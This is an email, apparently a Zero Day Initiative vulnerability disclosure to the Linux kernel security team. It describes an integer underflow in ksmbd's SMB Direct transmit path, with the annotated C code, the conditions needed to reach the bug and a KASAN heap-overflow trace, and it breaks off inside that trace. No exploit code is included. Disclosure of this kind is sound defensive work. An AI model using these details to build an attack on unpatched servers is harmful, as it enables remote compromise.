Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.remote-ip=18.208.22.128
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=fail;
	t=1792617421;
	b=GZk96+JhAZr6F5x85qzURSSi7sAFrKorSQqYKJEtUdumyY/PgFVuof39lpnoFcL1c3ty
	 8qerxZ7fZEKaxCtpJAJ/6CW1zZyPoHz5rx2mN8THoeDLDBgB1TGUhS44RRXhn4CDFNpji
	 i+gJddWs1+LXm8umPXu04JHUFJPi5yWcMTAN0DgwJW0UrU8lkv2s5ODDJA34LFM+HzXD+
	 5QVrrYk02F1QTXh7X9qMrRT+QXLw2TmT4kSxsQnc8JtjODU5rJOYXoUbfJy+m4J7oi9qG
	 fA2U862VerUgWO9LdyDd6QYL0+sb2s88BmensJ2GN29+GRm6LglOk/vM2PCg0ZK7amw==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792617421;
	h=DMARC-Filter:Received:X-TM-MAIL-RECEIVED-TIME:X-TM-MAIL-UUID:
	 Received:Received:Received:From:To:CC:Subject:Thread-Topic:
	 Thread-Index:Content-Class:Date:Message-ID:Accept-Language:
	 Content-Language:X-MS-Has-Attach:X-MS-TNEF-Correlator:msip_labels:
	 x-ms-publictraffictype:x-ms-traffictypediagnostic:
	 x-ms-office365-filtering-correlation-id:
	 x-ms-exchange-atpmessageproperties:x-ms-exchange-senderadcheck:
	 x-ms-exchange-antispam-relay:x-microsoft-antispam:
	 x-microsoft-antispam-message-info:x-forefront-antispam-report:
	 x-ms-exchange-antispam-messagedata-chunkcount:
	 x-ms-exchange-antispam-messagedata-0:Content-Type:
	 Content-Transfer-Encoding:MIME-Version:
	 X-Exchange-RoutingPolicyChecked:X-OriginatorOrg:
	 X-MS-Exchange-CrossTenant-AuthAs:X-MS-Exchange-CrossTenant-AuthSource:
	 X-MS-Exchange-CrossTenant-Network-Message-Id:
	 X-MS-Exchange-CrossTenant-originalarrivaltime:
	 X-MS-Exchange-CrossTenant-fromentityheader:
	 X-MS-Exchange-CrossTenant-id:X-MS-Exchange-CrossTenant-mailboxtype:
	 X-MS-Exchange-CrossTenant-userprincipalname:
	 X-MS-Exchange-Transport-CrossTenantHeadersStamped:X-TM-AS-ERS:
	 X-TMASE-Version:X-TMASE-Result:X-TMASE-MatchedRID:X-TMASE-XGENCLOUD:
	 X-TM-Deliver-Signature:X-TM-Addin-Auth:X-TM-Addin-ProductCode:
	 DKIM-Signature;
	bh=GumzZ7KZtICaJSp/NTYqILws2BIKxGfQqF+la9zDOSQ=;
	b=eA9cezwMZtXiaAjbxHRZXqYCoexmYkHbhDqhM+BGIxoOgbPwgB2U4eFrzVzCOMShvqCL
	 iLhmmN1sd+MosyUxiDsqJ5KmH8FoaJKUSKzdIf7Ps+IamMs4nluj1DSOkB8S1+kwN/WXq
	 ZTj6tK/VyYSTx1QMgzbha/1olWilovoO1CtxxdTsiQ9beDhoyPn491SgUiduYFu5NKBFE
	 jwLtEJM4mIO4lPjOMSOQ443EMiAwuVMERXngKDapfCbWizIAr7nHHHzYmcvyLmu/KLAfb
	 YQVkIzy1w93gAMEJ+2/ncz+mJLzN9PChqKjQglr2r/dlk+OA815xFlyafjI+Mg26Hlg==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=trendmicro.com;
	spf=pass smtp.mailfrom=trendmicro.com;
	dkim=pass header.d=trendmicro.com header.i=@trendmicro.com header.a=rsa-sha256 header.s=TM-DKIM-20260724121021 header.b=IG47fmvA;
	arc=fail smtp.remote-ip=18.208.22.128
Received: from repost01.tmes.trendmicro.com (repost01.tmes.trendmicro.com [18.208.22.128])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 92B39606A31A;
	Wed, 21 Oct 2026 21:17:00 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 92B39606A31A
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=trendmicro.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=trendmicro.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=trendmicro.com header.i=@trendmicro.com header.a=rsa-sha256 header.s=TM-DKIM-20260724121021 header.b=IG47fmvA
Received: from 52.101.46.61_.trendmicro.com (unknown [192.168.196.219])
	by repost01.tmes.trendmicro.com (Postfix) with SMTP id BB287C000855;
	Wed, 21 Oct 2026 21:16:53 +0000 (UTC)
X-TM-MAIL-RECEIVED-TIME: 1792617410.832000
X-TM-MAIL-UUID: c2072718-7506-4981-a023-be3ae4a1155b
Received: from CO1PR03CU002.outbound.protection.outlook.com (unknown [52.101.46.61])
	by repre01.tmes.trendmicro.com (Trend Micro Email Security) with ESMTPS id CB3E5C000428;
	Wed, 21 Oct 2026 21:16:50 +0000 (UTC)
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=onPOc+Gb5X4bM3g4NQ6sqWUSfPJugISRgIFrjlaoTdV1GIm7f23YD2JHHd+CTUz+TB9uxE2hSjfm6cZWFDd5WsawL3QANP2wsGdQnyPNlHbvSjJVw9zD7oeStinwis+6OG9VIcyPuCjg2XIZFMjpc3iM0ko+QsgLtQGKdR4q7FE9FhbO93//cZTZfImfH+GsESQmkiYmdveYcTcEurCpf9ZrDDfmTt9bbL4a8XUxRu7cXLWbITFfjumCHOmFV/bveg5g21f4Cr3Lje8C5irrVI7n+F4gXv9fBbCiU9gw6BK/ybElCrAkirzT8vNzHM03jl/Yi4945b/iTOniqDCv9A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=mT/J41/0JFklLZsG7WqbS8R2IqRySNYNpjyi1dnHIok=;
 b=aFGpoUI23rhqj0HXTBvZSGVGB5rTs1isGZy48iVDpy8lNpWxMab7fph2MOKGPY2zddO3xo96vIJ7JGmtzO8Aa+p/G+s8nPfGwPiCNbM66LncBGtqhcMTUzAIpqVOPkoxb0NsK69kZYDYCCZxPBIKuSPAbV4psNPPVU+bt+iSJsAuqKzv+IAt6MJxTGBJrooLUz8Tjg6iDciJ0nTJnJAOUmrpPExHSeh0BtDRYLtqUMDyVVX4zuXm3av2qQcjdi2I1s7w/gVz0CvDtvoC1FPX/mJEa/VAXouhSR5CLVAc680P43+ommIKRoZQpPkFRvr+c5CQNxQ5guFDDEd5L57xCA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=trendmicro.com; dmarc=pass action=none
 header.from=trendmicro.com; dkim=pass header.d=trendmicro.com; arc=none
Received: from BYAPR01MB3830.prod.exchangelabs.com (2603:10b6:a02:83::21) by
 SA1PR01MB994642.prod.exchangelabs.com (2603:10b6:806:4de::18) with Microsoft
 SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.21.546.15; Wed, 21 Oct 2026 21:16:47 +0000
Received: from BYAPR01MB3830.prod.exchangelabs.com
 ([fe80::29c9:1f31:48fd:8ccf]) by BYAPR01MB3830.prod.exchangelabs.com
 ([fe80::29c9:1f31:48fd:8ccf%5]) with mapi id 15.21.0522.017; Wed, 21 Oct 2026
 21:16:46 +0000
From: "zdi-disclosures@trendmicro.com" <zdi-disclosures@trendmicro.com>
To: "security@kernel.org" <security@kernel.org>
CC: Namjae Jeon <linkinjeon@kernel.org>, Paulo Alcantara <pc@manguebit.org>,
	Stefan Metzmacher <metze@samba.org>, Tom Talpey <tom@talpey.com>, "open
 list:SMBDIRECT (RDMA Stream Transport with Read/Writ..."
	<linux-cifs@vger.kernel.org>, "moderated list:SMBDIRECT (RDMA Stream
 Transport with Read/Writ..." <samba-technical@lists.samba.org>, open list
	<linux-kernel@vger.kernel.org>
Subject: ZDI-CAN-33549: New Vulnerability Report
Thread-Topic: ZDI-CAN-33549: New Vulnerability Report
Thread-Index: Ad1hoVwVLjh2ZWU5RROG+tkw6G9saw==
Content-Class:
Date: Wed, 21 Oct 2026 21:16:46 +0000
Message-ID:
 <BYAPR01MB3830472B5702C089B0BBB77D80662@BYAPR01MB3830.prod.exchangelabs.com>
Accept-Language: en-US, es-ES
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
msip_labels:
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_ActionId=52a3c350-14f2-4d30-a166-730923b3e47d;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_ContentBits=0;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Enabled=true;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Method=Privileged;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Name=Public
 Information - no
 protection;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_SetDate=2026-10-21T21:16:43Z;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_SiteId=3e04753a-ae5b-42d4-a86d-d6f05460f9e4;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Tag=10,
 0, 1, 1;
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: BYAPR01MB3830:EE_|SA1PR01MB994642:EE_
x-ms-office365-filtering-correlation-id: 27273219-d9f1-4b90-1c64-08df2fb89d1c
x-ms-exchange-atpmessageproperties: SA
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam:
 BCL:0;ARA:13230040|23010399003|1800799024|376014|366016|6133799003|55112099003|18002099003|10067099003|261021130227099003|261021121427099003|3023799007|261021135927099003|261021123027099003|38070700021|11063799006|5023799004|261009223027099003|261021133027099003|56012099006;
x-microsoft-antispam-message-info:
 UefTAHMA4w9b9mAonJuTrbPjDK4/31RUrTuvuX9UBIh6jNSnOhvOjASODr1ka0bymY9PU9wHAnaPyFskz1aIPchL88ooyUBcy9590sL3L8AxZq7a32CDG4TpBNimAu3zlhOZJtM2UDOHFKC4lSroLgrN3+V/ZTyb5Q132M8GGeauaCnn/oEAP0S7ku38eJQiKpu9mJNutw9vPCkWPkkDE43RBc8YxgCwS8p2HQRFL2kTMtKT8QA2VHimqryx0TwgbetFfFS3uBA/mTqUa/zgZXXz0lBZHMKczordKfoFN4p9kzzW47Y+XuQpb9OgWF0TcTlOLQ9JWBbB9d3HRTyxrFysGFocpOVg5BRkvrqJoPsLLKzVmmeyzaTDlxcSxz6ugXMhNo1dP3yh8kq4DsZ2wwgt0wfrPi9/ACzT7ur15XRzLAclTnD+JwQGbdRfnNFghQXOhzVdWXeb3gzBf4S8Bkcimk8+r4KKbstZTBuOEjL/7eXuY+YZvIoByPRfNV4HiO+uaoogt6Dw5pvlPB+AZ5VxNUZpmUXpmXx0eabW7mObEOmUpJkShrR2wMSjhVSRJbZzznLsEtQUqzR9cRQf+HnrqlhEr99wlfTowWS/G5nkmixjclTF+Rdc2CgELyc1pnn40YnVDTjs+f621aGxzKipbixi4F7zHk2Czg9LIIw=
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BYAPR01MB3830.prod.exchangelabs.com;PTR:;CAT:NONE;SFS:(13230040)(23010399003)(1800799024)(376014)(366016)(6133799003)(55112099003)(18002099003)(10067099003)(261021130227099003)(261021121427099003)(3023799007)(261021135927099003)(261021123027099003)(38070700021)(11063799006)(5023799004)(261009223027099003)(261021133027099003)(56012099006);DIR:OUT;SFP:1101;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?OzV3Xu9U5z7MWmMoYbKEhhp7zCXP8JgUBasNYOXEeCE7YlpZC/Ly72aH7GmG?=
 =?us-ascii?Q?2vmsrXdQ8m8ijQh9fnLZq/+XXLHNtu7AQyPMusBLhdJQXetkk4/8z2elCBH2?=
 =?us-ascii?Q?vLyznKebV8Xmra8F/USlRGHeVHe+j8r05e0gtuUHespoH2B4SGthNthbhbgx?=
 =?us-ascii?Q?a1crxVlkT1rrUpDbWOoKvUWjzvsqKeoIJoMbi5QOoBdVaC6uKt9Y4McsQanL?=
 =?us-ascii?Q?xRmQM96MMWCXNFPMPQPzquLofD8SZiGFKuemaLX2l2dpm+dcscOfGmk6e8e3?=
 =?us-ascii?Q?ngfBJVLl3NsRlMwEL8mxJqryAKuWR8K5NRYaXJWXiw0BSWzRmA14bPcwOJ1I?=
 =?us-ascii?Q?XPeH64suklbhewL/nGfVR6Y3FLUAWa6PQu0xlZXAjoSOyLUgoW+JVO+0bgUm?=
 =?us-ascii?Q?udthLLcuQwYgvvVSF++hmWtVLc0uIkiRZ/xKA3h6YK8ixeqnW1gDLeNGj/Nf?=
 =?us-ascii?Q?VPepIdO5ObqxEGNzYDj8tf07xKemDEqt/NGD/niOuM/LEoXqKLuw1YWg03P2?=
 =?us-ascii?Q?ZRGQ+e7aAWRxapoZfbq6J3YSxF2RjNNYoQzqK0raEH9GQGfN77Eb8sTnt5bK?=
 =?us-ascii?Q?DK7x/g5QnTIjFtKB6cflbtbUA2edh2nwMH8tzmWpibViv+b/Wh03r2/xOzAp?=
 =?us-ascii?Q?zNcC92b17HmQbQDI964ZbpJNMvbSXN1QhEjQcRfWreVmwO72Ghz1owTDyfO9?=
 =?us-ascii?Q?sfR15rtFbu27+gWxnZaV5kyIvB/0M7DuvMVO/wYej1IC1s5CR0Jrk0Qv0VLq?=
 =?us-ascii?Q?jthMb1EjYCuDgv5RogqKTpAIU3e53j/iTySridtH5RKnr53Ga7sOo+Xs7o3H?=
 =?us-ascii?Q?dc7SNgJRiT2yTOuK7mwB2yQLHDnpWe4wbervwmPeSmOVXTtXcmM6F3NInTxb?=
 =?us-ascii?Q?b+8ltt7Yy141F0BBXR624Q//ZMIPbCdmwwgjDBeCd8eXcqaxCrMw2Wld0902?=
 =?us-ascii?Q?Rmcbwui4h94rU33MMRDmlGk2iE/8cEtsZ4G+ev0E8J5X6l73Uiymg2MHi/CN?=
 =?us-ascii?Q?xcmpe0LOSryxFYD0k03B80ZXdD56hhjASxxOcyVfsf7v6RriFi3Yog+zpb8i?=
 =?us-ascii?Q?Gw4loaM/XfSr6rjvQFd4gh2alCKhUsX8GvlzgjCPOWKAIktTWXzIAP4uQTvD?=
 =?us-ascii?Q?FnrWr6/WbGdSdvI8XCMifgnK/d540Kse2LEIXabmHE6cPB+kAPEo3EfEPgYv?=
 =?us-ascii?Q?8Ep3zwY/TjIxK1k4lZCNfaeyaqybuTQZcVEjwzItd5HMLsWJqa+KAV5FhtJo?=
 =?us-ascii?Q?5W3jEF4dCKg+BzopmCdyBNtR2D5wHqipacm6nT/z0oVArAYjjrhnO6V08G21?=
 =?us-ascii?Q?jJDIz+TPx9HubvPibi7KdkyGJxxOtgsX9XCTErELZIsXhmqGTmWzKDLRqe1w?=
 =?us-ascii?Q?5wBxoQdjcUilDJ7uV6+OCn7K5paXNFLwP3/r5b5+0l18bJxTlYA7hE2EvWyt?=
 =?us-ascii?Q?sC+hGYCORbXRIY4Q6jYK7svMEZNJhUytnmQNnIbIbgWv0gqEGn72AoV30Mp3?=
 =?us-ascii?Q?qSdoxweB7Jc/pK0W6aLQxx6bkUICrgNLEKeUU7YjSdIZ6X6BuEvGKb0/PjKm?=
 =?us-ascii?Q?/gJ3A/BD38jXURvlEh9hYsJvf2OLD++MYEoE8WvRZ8z0/zeXYLhkkPTUI9a6?=
 =?us-ascii?Q?JxQr0xv6hZ4q5Z2ImFKhkrb6Q3+YKM9iVPrnpenmA5dH85BaIBCwe5AZ3deT?=
 =?us-ascii?Q?f49nOBTnz7vgaFMy4W9TW26yGQUcroSKKIOJpIf5iST+Zt2k5BWdxo3aYGjP?=
 =?us-ascii?Q?Jr7v52XgMSBdjr625n4qsKOmfxQWgEU=3D?=
Content-Type: text/plain;
	charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Post: <mailto:linux-cifs@vger.kernel.org>
List-Help: <mailto:linux-cifs+help@vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-cifs+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
X-Exchange-RoutingPolicyChecked:
	1JzzTuIzr556Ezt2J3RKa+arm7w4zUY3Xpuj+jiQTYKVcCmbN2goffj+dHbIStdIp3LCgIJxCv40Nmw6Yzp+lwTz9qhB9aNlPPW1OKHfz7mISst5/yVs0HLtzt2wNwLbkMqH+Vs27NcwEQ/XY4XKoocODia/xPHmrAz77fyXTxaMdnMatEwNExKj+SNZA/aS/4awnFdgdoUsjPY5xqvhB711TMCjNn1pM4KaIZPtcXeLemr8JHHEPevaZlsgCSjrvcLctnuyoBxyX5P7JJnERXa0NijNuJ7yIIThFG1qUeOuwUwunxHVyYoIeDsfD/B2t7A4xYZfCmitA+WTKafg7Q==
X-OriginatorOrg: trendmicro.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: BYAPR01MB3830.prod.exchangelabs.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 27273219-d9f1-4b90-1c64-08df2fb89d1c
X-MS-Exchange-CrossTenant-originalarrivaltime: 21 Oct 2026 21:16:46.6161
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 3e04753a-ae5b-42d4-a86d-d6f05460f9e4
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: QLzQICIlyzXslxQ5DG6wjP/N5uFUHLcwEkZzsUCgNYcVgBitTOr+0Jw/o3hsCpbe1pJqmMf6qogpu0pK40TkvcMvE5qHfi9sc/E1ua4ygB4=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: SA1PR01MB994642
X-TM-AS-ERS: 52.101.46.61-0.0.0.0
X-TMASE-Version: StarCloud-1.3-9.2.1014-30272.002
X-TMASE-Result: 10--24.794200-4.000000
X-TMASE-MatchedRID: dWURJeuh+/Zyv0jrUI8Jl2sl1BC8d8yLDDefJB45v/EE+XCcxaVegAYj
	RkHo2DfRammXEpmvRo9rvOHJI9hgmFBme2pVg1BbgEjtxrCIZOmuQrmGrkWBDdRYShGK7zm0YUd
	h2Fo9g6YlCS3E1jM4s6h7zaPPmgQuWA2/2xVFuO/q1qBLseWnyAqidEWyd229gdXztqOEBnAhSw
	SCTVXtG9Q2foGBJHgffrTmUrjooVN1aFsfHz+GReNmYNc/yKTMeWsf9OQoKxGUiGLkY8AZ40D1X
	OJM4CvSwBFbZXnCkSx//YWlr7WJcO9eTfOIBl+QvAKtqRqDy6PJtoyGVE0N8K7YWxYRnT/Cu5fR
	OEbKeInMfDt3OZsh5nRg2jIMAjjd05t73EL89/0VtNXPrfG2IMRQTzxWeSWWbNjTSFpLxChysCO
	no2fP9cR7cfarf9a/ydDR6YBfJnzIuNKfYHvw6W34x1yprvcbxxh6MdbXuKCFIyPjx+3RIKIysj
	VZlzq7waeCFn3WtUfMdm3wTlky7wKfjxNOs0A0eeVvkeXx8unxjWAMewuQQtD/0zX9Tgyu9mFYX
	DyCbwklfy1N5DNfB6B/tvY72DKfftTV5S2xLn3Ss+HwpsYJv4WEan0Y08OtuKgGjerL2kgSH7Pl
	QQpDIkvlFXHjeIkgm+gNhVmOTgfkKL1ojbCFj5qSF/Yla2olJw66cQh/R5fmljAKHMq/CZOA2gZ
	cDgVvX+JuQihi4/Z/t1hdS8G1bxyq5uU3QLgmsxLNlFFsw5U+aTwpj+UULZmenOrgNUa/P9Xslg
	rYXl8R41St/qTSiA5NhWfIfAGDoajgZ/8hLAYCngKphxwWrzmoMBkrmuf/mCYM4MaoFU8QSZo0P
	rLGOq+eCSMeOiOkl1TB1A2F1mKN4P4XksxlV7dA+vQ5FeQh9sZwGSzm/nfbyADE/9Ozoge98bp2
	8iq6AcaXt2KLG5iaFLMxELUb2Q==
X-TMASE-XGENCLOUD: 2dc8218e-dce9-4849-8e7e-fa79fc082a27-0-0-200-0
X-TM-Deliver-Signature: 0499BFA48C04B79BCF107FA31065D462
X-TM-Addin-Auth: 2PVLw0wrDIBBSE4wBxJkHJIixqEdqhWQWZBbdev0YLUVRUI3TlSCxv+/ZS4
	aG06hYdACIiMnX/L0XHOiTgLxFidTE8qrFzglXQyVinxy+kqVeGhhUcGJWRY1WOUoR/CvQVru5m
	aTiHIhDHnrfPMWe53HpT5sqTvi2ZVbh3jPfAd2oeVVCRTN0wLD7ITsT9z/Vh62hKGYGh+DCTUaP
	erW2ek80Po38PnctdIlvqU+waSpe1TzSLTomaClATMNG9jepTmYKto7If9vuVW3WY24HqGNssBa
	Lng42XE3NBasnrE9Rzk3wPRmjkZdsdqcaLLoddQsjluQ6l68XaoQBCoKsA==.gZE3Tt0OXwNfNu
	w6A1yKYhv4jlrg1Fsg6UsMk/aZP9KFeuO7G9IrEoOGO0MbpLtFAMIw4r7/NQpjyV/BKQggVsR1B
	EM2m2/AhLo5uid/GJ9wnvpzes1WBORfKPGSpimvrn20CsGAvCFMkfwUdRDr2E4/XPdWu3C5/EhN
	1Fa+kt/edgkaD+8U03CjC+Ywm5kvuxARaB6PnT1pkRa71XH+oYrZ7i63+YkL8xMHVnmvxw6+49V
	bvYh0niZSWjGdnqF7/msFTCJEJkQn9SOJoAYMtmOqpFGOZCpRMDY/xoSWOqrzUnEvu/ioUgIQUz
	NlIfk6xVzPEU11Q+LR8Ee27xX2TQ==
X-TM-Addin-ProductCode: EMS
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=trendmicro.com;
	s=TM-DKIM-20260724121021; t=1792617413; x=1792790213;
	bh=bSzJV4v2IT72uQi+/wn/lj5Lrn96QEe1khvhLpGh2G0=;
	h=From:To:Subject:Date:Message-ID:Content-Type:MIME-Version:From:To:
	 Date:Message-ID:Subject:Content-Type:Reply-To:MIME-Version;
	b=IG47fmvASZZPeAgTz7rmJsLhu0u0p14EQStjr+gIsI6/GM0ErthZALtsEwhDSQizb
	 Cz4dCbVqawY29QUSrjwJTwiHXIRksh076x8dSyjSMoyrPwccRIJ1bd6pXcyyLbiMYk
	 6SHZ7GY8wcA5+sWsx0oVV8iPUp+RPnhuw0sdrHXBcMR+6VPlWHVNYY/Dpxr6Nlgrzx
	 xOqUzPrtqlKo2taiXaw7KHErIApkwxaqWczTb5wLvq/YF3l6JPYGcCM+jm83WvyYXk
	 Hk9Xs9ojp5bw5A119r3/EVHA8V12B142VVxRV3twI4zdO6RGlqD3vytnIoyA+ywKeE
	 IGwsi6cw1Rb2w==

ZDI-CAN-33549: Linux Kernel KSMBD SMB Direct Integer Underflow Remote Cod=
e Execution Vulnerability

-- CVSS -----------------------------------------

9.0: AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H

-- ABSTRACT -------------------------------------

Trend Micro's Zero Day Initiative has identified a vulnerability affectin=
g the following products:
Linux - Kernel KSMBD

-- VULNERABILITY DETAILS ------------------------
* Version Tested:7.3-rc3
* Platform Tested:debian trixie

---

### Analysis

integer underflow in smbdirect_connection_rdma_xmit()
The reproduce kernel built with CONFIG_SMB_SERVER_SMBDIRECT=3Dy + CONFIG_=
RDMA_RXE=3Dy
Here is the target requirement
1) RDMA device
2) writable share
3) smb direct (ubuntu only)

~~~C++
int smbdirect_connection_rdma_xmit(struct smbdirect_socket *sc,
=09=09=09=09   void *buf, size_t buf_len,
=09=09=09=09   struct smbdirect_buffer_descriptor_v1 *desc,
=09=09=09=09   size_t desc_len,
=09=09=09=09   bool is_read)
{
...
=09for (i =3D 0; i < desc_len / sizeof(*desc); i++) {
=09=09if (!buf_len)
=09=09=09break;

=09=09desc_buf_len =3D le32_to_cpu(desc[i].length);
=09=09if (!desc_buf_len)
=09=09=09return -EINVAL;

=09=09if (desc_buf_len > buf_len) {
=09=09=09desc_buf_len =3D buf_len;
=09=09=09desc[i].length =3D cpu_to_le32(desc_buf_len);
=09=09=09buf_len =3D 0;=09=09=09=09=09=09=09=09=09=09=09// (1)
=09=09}

=09=09credits_needed +=3D smbdirect_connection_calc_rw_credits(sc,
=09=09=09=09=09=09=09=09       desc_buf,
=09=09=09=09=09=09=09=09       desc_buf_len);
=09=09desc_buf +=3D desc_buf_len;
=09=09buf_len -=3D desc_buf_len;=09=09=09=09=09=09=09=09=09// (2) integer=
 underflow, and leads to heap overflow within rxe_mr_copy()
=09=09desc_num++;
=09}

~~~

KASAN report
```
BUG: KASAN: slab-out-of-bounds in rxe_mr_copy_dma /root/linux/drivers/inf=
iniband/sw/rxe/rxe_mr.c:372
BUG: KASAN: slab-out-of-bounds in rxe_mr_copy+0x3a2/0x600 /root/linux/dri=
vers/infiniband/sw/rxe/rxe_mr.c:396
Write of size 1024 at addr ffff888023a610a8 by task kworker/u19:1/49

CPU: 2 UID: 0 PID: 49 Comm: kworker/u19:1 Not tainted 7.3.0-rc3 #4 PREEMP=
T(lazy)
Hardware name: QEMU Ubuntu 25.10 PC v2 (i440FX + PIIX, + 10.1 machine, 19=
96), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
Workqueue: rxe_wq do_work
Call Trace:
 <TASK>
 __dump_stack /root/linux/lib/dump_stack.c:94
 dump_stack_lvl+0x100/0x190 /root/linux/lib/dump_stack.c:120
 print_address_description /root/linux/mm/kasan/report.c:378
 print_report+0x139/0x4ad /root/linux/mm/kasan/report.c:482
 kasan_report+0xe4/0x1d0 /root/linux/mm/kasan/report.c:595
 check_region_inline /root/linux/mm/kasan/generic.c:186
 kasan_check_range+0x125/0x200 /root/linux/mm/kasan/generic.c:200
 __asan_memcpy+0x3c/0x60 /root/linux/mm/kasan/shadow.c:106
 rxe_mr_copy_dma /root/linux/drivers/infiniband/sw/rxe/rxe_mr.c:372
 rxe_mr_copy+0x3a2/0x600 /root/linux/drivers/infiniband/sw/rxe/rxe_mr.c:3=
96
 copy_data+0x393/0x680 /root/linux/drivers/infiniband/sw/rxe/rxe_mr.c:481
 do_read /root/linux/drivers/infiniband/sw/rxe/rxe_comp.c:363
 rxe_completer+0x195c/0x41d0 /root/linux/drivers/infiniband/sw/rxe/rxe_co=
mp.c:702
 rxe_sender+0x20/0x60 /root/linux/drivers/infiniband/sw/rxe/rxe_req.c:860
 do_task /root/linux/drivers/infiniband/sw/rxe/rxe_task.c:127
 do_work+0x19a/0x770 /root/linux/drivers/infiniband/sw/rxe/rxe_task.c:191
 process_one_work+0xaf7/0x1b30 /root/linux/kernel/workqueue.c:3396
 process_scheduled_works /root/linux/kernel/workqueue.c:3479
 worker_thread+0x5eb/0xe50 /root/linux/kernel/workqueue.c:3560
 kthread+0x373/0x450 /root/linux/kernel/kthread.c:436
 ret_from_fork+0x72b/0xd30 /root/linux/arch/x86/kernel/process.c:158
 ret_from_fork_asm+0x1a/0x30 /root/linux/arch/x86/entry/entry_64.S:245
 </TASK>

Allocated by task 30:
 kasan_save_stack+0x30/0x50 /root/linux/mm/kasan/common.c:57
 kasan_save_track+0x14/0x30 /root/linux/mm/kasan/common.c:78
 poison_kmalloc_redzone /root/linux/mm/kasan/common.c:398
 __kasan_kmalloc+0x9a/0xb0 /root/linux/mm/kasan/common.c:415
 kasan_kmalloc /root/linux/./include/linux/kasan.h:263
 __do_kmalloc_node /root/linux/mm/slub.c:5414
 __kvmalloc_node_noprof+0x352/0x9a0 /root/linux/mm/slub.c:7014
 smb2_write+0x1dce/0x30d0
 __process_request /root/linux/fs/smb/server/server.c:160
 __handle_ksmbd_work /root/linux/fs/smb/server/server.c:277
 handle_ksmbd_work+0x61a/0x1ff0 /root/linux/fs/smb/server/server.c:368
 process_one_work+0xaf7/0x1b30 /root/linux/kernel/workqueue.c:3396
 process_scheduled_works /root/linux/kernel/workqueue.c:3479
 worker_thread+0x5eb/0xe50 /root/linux/kernel/workqueue.c:3560
 kthread+0x373/0x450 /root/linux/kernel/kthread.c:436
 ret_from_fork+0x72b/0xd30 /root/linux/arch/x86/kernel/process.c:158
 ret_from_fork_asm+0x1a/0x30 /root/linux/arch/x86/entry/entry_64.S:245

The buggy address belongs to the object at ffff888023a610a0
 which belongs to the cache kmalloc-8 of size 8
The buggy address is located 0 bytes to the right of
 allocated 8-byte region [ffff888023a610a0, ffff888023a610a8)

The buggy address belongs to the physical page:
page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xffff888023a6=
1400 pfn:0x23a61
flags: 0xfff00000000200(workingset|node=3D0|zone=3D1|lastcpupid=3D0x7ff)
page_type: f5(slab)
raw: 00fff00000000200 ffff88801c442500 ffffea00009adb50 ffff88801c440348
raw: ffff888023a61400 0000000000800020 00000000f5000000 0000000000000000
page dumped because: kasan: bad access detected
page_owner tracks the page as allocated
page last allocated via order 0, migratetype Unmovable, gfp_mask 0xd2cc0(=
GFP_KERNEL|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9=
639, tgid 9639 ((les-load)), ts 57473223994
 set_page_owner /root/linux/./include/linux/page_owner.h:33
